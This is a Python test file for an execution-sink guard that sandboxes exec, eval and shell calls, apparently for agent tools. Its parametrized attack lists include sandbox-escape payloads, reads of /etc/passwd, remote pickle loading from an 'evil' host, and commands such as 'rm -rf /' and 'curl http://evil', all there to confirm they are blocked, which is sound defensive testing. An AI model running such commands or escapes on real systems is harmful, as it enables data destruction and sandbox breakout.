# SPDX-License-Identifier: AGPL-3.0-or-later
"""Tests for morie._exec_guard -- the central execution-sink guard."""

import math

import pytest

from morie._exec_guard import (
    ExecGuardError,
    exec_disabled,
    guarded_exec,
    safe_eval_expr,
    safe_shell_run,
)


class TestGuardedExec:
    def test_allows_whitelisted_analysis_code(self):
        ns = {}
        guarded_exec("import math; a = [math.sqrt(4), 5]; b = sum(a)", ns)
        assert ns["a"] == [2.0, 5] and ns["b"] == 7.0

    def test_allows_morie_import(self):
        # data-setup preamble used by agent tools
        guarded_exec("group1 = [1, 2, 3]; group2 = [4, 5, 6]", {})

    @pytest.mark.parametrize(
        "attack",
        [
            "import os; os.system('id')",
            "__import__('subprocess').run(['id'])",
            "open('/etc/passwd').read()",
            "().__class__.__bases__",
            "eval('1+1')",
            "exec('x=1')",
            "import socket",
            # gadgets reachable via whitelisted libs
            "import pandas as pd; pd.read_pickle('http://evil/x.pkl')",
            "import numpy; numpy.ctypeslib.load_library('x', '.')",
            "import numpy as np; np.load('x.npy', allow_pickle=True)",
            # str.format dunder-traversal escape
            "y = '{0.__class__.__mro__}'.format(int)",
        ],
    )
    def test_blocks_attacks(self, attack):
        with pytest.raises(ExecGuardError):
            guarded_exec(attack, {})

    @pytest.mark.parametrize(
        "code",
        [
            "import json; d = json.loads('{\"a\": 1}')",
            "import numpy as np; a = np.load('x.npy')",
            "import numpy as np; a = np.load('x.npy', allow_pickle=False)",
        ],
    )
    def test_does_not_over_block_safe_code(self, code):
        # these must validate (they may fail at runtime on missing files,
        # but the guard itself must not reject them)
        from morie._exec_guard import validate_source

        validate_source(code)


class TestSafeEvalExpr:
    def test_arithmetic_and_bool(self):
        assert safe_eval_expr("2 ** 3 + 1") == 9
        assert safe_eval_expr("True and (False or not False)") is True

    def test_namespace_attribute_call(self):
        assert safe_eval_expr("m.sin(x)", {"m": math, "x": 0.0}) == 0.0

    @pytest.mark.parametrize(
        "attack",
        [
            "__import__('os').system('id')",
            "().__class__.__subclasses__()",
            "x._secret",
            "eval('1')",
        ],
    )
    def test_blocks_attacks(self, attack):
        with pytest.raises(ValueError):
            safe_eval_expr(attack, {"x": 1})


class TestSafeShellRun:
    def test_allowlisted_runs(self):
        r = safe_shell_run("echo hello world")
        assert r.stdout.strip() == "hello world"

    def test_non_allowlisted_blocked(self):
        for cmd in ("rm -rf /", "curl http://evil", "bash -c 'x'"):
            with pytest.raises(ExecGuardError):
                safe_shell_run(cmd)

    def test_metacharacters_are_inert(self):
        # shell=False => ';' and '|' are literal argv tokens, never operators
        r = safe_shell_run("echo hi; rm -rf /")
        assert "rm" in r.stdout and r.returncode == 0


class TestKillSwitch:
    def test_no_exec_env_disables_everything(self, monkeypatch):
        monkeypatch.setenv("MORIE_NO_EXEC", "1")
        assert exec_disabled() is True
        with pytest.raises(ExecGuardError):
            guarded_exec("a = 1", {})
        with pytest.raises(ExecGuardError):
            safe_shell_run("echo hi")

    def test_unset_allows(self, monkeypatch):
        monkeypatch.delenv("MORIE_NO_EXEC", raising=False)
        assert exec_disabled() is False
